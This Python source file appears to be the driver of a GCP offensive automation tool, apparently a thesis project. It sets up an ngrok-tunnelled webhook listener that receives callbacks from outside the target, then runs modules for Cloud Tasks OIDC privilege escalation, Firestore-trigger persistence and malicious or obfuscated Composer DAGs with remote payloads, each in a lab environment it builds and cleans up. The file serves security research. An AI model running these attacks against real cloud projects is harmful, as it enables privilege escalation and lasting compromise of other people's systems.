import subprocess
import argparse
import os
import time
import signal
import re
from pyfiglet import Figlet

def print_banner():
    f = Figlet(font='slant')
    print(f.renderText('CLOUD TFM TOOL'))

def run(command, step_desc):
    print(f"\n[✓] {step_desc}")
    try:
        subprocess.run(["python3"] + command.split(), check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error in Step: {step_desc}")
        print(e)
        exit(1)

def authenticate_service_account():
    print("[0/4] Authenticating service account...")
    result = subprocess.run([
        "gcloud", "auth", "activate-service-account",
        "internal-support@poc-tfm-tests.iam.gserviceaccount.com",
        "--key-file=internal-support-key.json",
        "--project=poc-tfm-tests"
    ], capture_output=True, text=True)

    if result.returncode != 0:
        print("[!] Authentication failed:")
        print(result.stderr)
        exit(1)
    else:
        print("[✓] Authentication successful.")

def kill_previous_listener():
    subprocess.run(["pkill", "-f", "webhook_listener"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_listener(abuse_type):
    print("[*] Starting webhook listener ...")
    if abuse_type == "cloud_tasks":
        listener_path = "modules/abuse_cloud_tasks/webhook_listener.py"
    elif abuse_type == "firestore_trigger":
        listener_path = "modules/abuse_firestore_trigger/webhook_listener_firestore.py"
    elif abuse_type == "composer_dag":
        listener_path = "modules/abuse_composer_dag/webhook_listener_composer.py"
    elif abuse_type == "composer_external_payload":
        listener_path = "modules/abuse_composer_external_payload/webhook_listener_composer_payload.py"
    else:
        print(f"[!] Unknown abuse type: {abuse_type}")
        exit(1)

    return subprocess.Popen(["python3", listener_path])

def start_ngrok_and_get_url():
    print("[*] Starting ngrok tunnel...")
    ngrok_proc = subprocess.Popen(["ngrok", "http", "8080"],
                                  stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)

    time.sleep(5)
    try:
        result = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode("utf-8")
        match = re.search(r'"public_url":"(https://[^"]+)"', result)
        if match:
            url = match.group(1)
            print(f"[+] Ngrok URL obtained: {url}")
            return ngrok_proc, url
        else:
            raise RuntimeError("Could not find public_url in ngrok response")
    except Exception as e:
        print(f"[!] Error getting Ngrok URL: {e}")
        ngrok_proc.terminate()
        return None, None

def save_url(url):
    with open("webhook_url.txt", "w") as f:
        f.write(url)
    with open("webhook_url.py", "w") as f:
        f.write(f'webhook_url = "{url}"\n')
    print("[✓] Saved webhook_url.txt and webhook_url.py")

def execute_abuse(abuse_type, use_existing_env=None):
    abuse_titles = {
        "cloud_tasks": "Cloud Tasks OIDC Privilege Escalation",
        "firestore_trigger": "Firestore Trigger Persistence Abuse",
        "composer_dag": "Composer DAG Escalated Privileges Abuse",
        "composer_external_payload": "Composer External Payload with Obfuscated DAG"
    }

    print(f"\n[*] Launching Offensive Automation: {abuse_titles.get(abuse_type, abuse_type)}")
    authenticate_service_account()
    os.environ['PYTHONPATH'] = '.'

    kill_previous_listener()
    listener_proc = start_listener(abuse_type)
    time.sleep(2)

    ngrok_proc, ngrok_url = start_ngrok_and_get_url()
    if not ngrok_url:
        print("[!] Could not get Ngrok URL. Aborting.")
        listener_proc.terminate()
        exit(1)

    save_url(ngrok_url)

    # Abuses
    if abuse_type == "cloud_tasks":
        run("modules/abuse_cloud_tasks/1_create_vulnerable_env.py", "[1/4] Creating environment")
        run("modules/abuse_cloud_tasks/2_execute_attack.py", "[2/4] Executing attack")
        run("modules/abuse_cloud_tasks/3_trigger_damage.py", "[3/4] Triggering damage")
        authenticate_service_account()
        run("modules/abuse_cloud_tasks/4_cleanup.py", "[4/4] Cleaning up")

    elif abuse_type == "firestore_trigger":
        run("modules/abuse_firestore_trigger/1_create_env.py", "[1/5] Creating environment and attacker-sa")
        run("modules/abuse_firestore_trigger/2_execute_attack.py", "[2/5] Executing attack as attacker-sa")
        run("modules/abuse_firestore_trigger/3_remove_attacker.py", "[3/5] Removing attacker service account")
        run("modules/abuse_firestore_trigger/4_test_persistence.py", "[4/5] Testing post-compromise persistence")
        run("modules/abuse_firestore_trigger/5_cleanup.py", "[5/5] Cleaning environment")

    elif abuse_type == "composer_dag":
        if use_existing_env:
            run(f"modules/abuse_composer_dag/1_create_env.py --use-existing {use_existing_env}", "[1/5] Reusing existing Composer environment")
        else:
            run("modules/abuse_composer_dag/1_create_env.py", "[1/5] Creating vulnerable Composer environment")
        run("modules/abuse_composer_dag/2_execute_attack.py", "[2/5] Deploying malicious DAG")
        run("modules/abuse_composer_dag/3_remove_attacker.py", "[3/5] Simulating post-compromise cleanup")
        run("modules/abuse_composer_dag/4_test_persistence.py", "[4/5] Validating DAG execution and persistence")
        run("modules/abuse_composer_dag/5_cleanup.py", "[5/5] Full environment cleanup")

    elif abuse_type == "composer_external_payload":
        if use_existing_env:
            run(f"modules/abuse_composer_external_payload/1_create_env.py --use-existing {use_existing_env}", "[1/5] Reusing existing Composer environment")
        else:
            run("modules/abuse_composer_external_payload/1_create_env.py", "[1/5] Creating vulnerable Composer environment")
        run("modules/abuse_composer_external_payload/2_execute_attack.py", "[2/5] Deploying obfuscated DAG and remote payload")
        run("modules/abuse_composer_external_payload/3_trigger.py", "[3/5] Triggering DAG execution")
        run("modules/abuse_composer_external_payload/4_test_persistence.py", "[4/5] Validating post-compromise persistence")
        run("modules/abuse_composer_external_payload/5_cleanup.py", "[5/5] Cleaning environment")

    else:
        print(f"[!] Abuse type '{abuse_type}' not implemented yet.")
        listener_proc.terminate()
        ngrok_proc.terminate()
        exit(1)

    # Final cleanup
    listener_proc.terminate()
    ngrok_proc.terminate()

def main():
    print_banner()
    print(" " * 50 + "Author: Alejandro Onrubia Carrero")
    print(" " * 50 + "Version: 1.0 | July 2025\n")

    parser = argparse.ArgumentParser(description="GCP Offensive Automation Tool")
    parser.add_argument('--abuse', choices=[
        'cloud_tasks', 
        'firestore_trigger', 
        'composer_dag',
        'composer_external_payload'
    ], required=True)
    parser.add_argument('--use-existing', help="(Only for Composer abuses) Name of existing Composer environment to reuse")
    args = parser.parse_args()

    execute_abuse(args.abuse, use_existing_env=args.use_existing)

if __name__ == "__main__":
    main()
